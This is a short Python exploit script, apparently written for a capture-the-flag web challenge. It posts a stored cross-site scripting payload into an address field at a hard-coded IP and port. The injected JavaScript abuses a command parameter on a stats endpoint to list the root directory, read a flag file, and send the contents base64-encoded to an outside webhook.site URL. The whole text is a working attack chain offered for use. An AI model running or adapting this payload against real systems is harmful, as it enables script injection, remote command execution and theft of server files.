#!/usr/bin/python3

import requests

url = 'http://94.237.59.185:46364/add/address'

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-GB,en',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://94.237.59.185:46364',
    'Referer': 'http://94.237.59.185:46364/add/address',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
}

data = {
    'address': '<script>(async () => {{let response = await fetch(\'/api/stats?command=ls+/\');let flag = await response.text();response = await fetch(\'/api/stats?command=cat+/flag\' + flag.split(\'flag\')[1].substr(0, 10) + \'.txt\');flag = await response.text();await fetch(\'https://webhook.site/6359e7c8-2047-46e5-801c-5e0a7be71e0d?c=\' + btoa(flag))}})()</script>'
}

response = requests.post(url, headers=headers, data=data, verify=False)  # Use verify=False for self-signed certificates

print(response.text)  # Print the response from the server
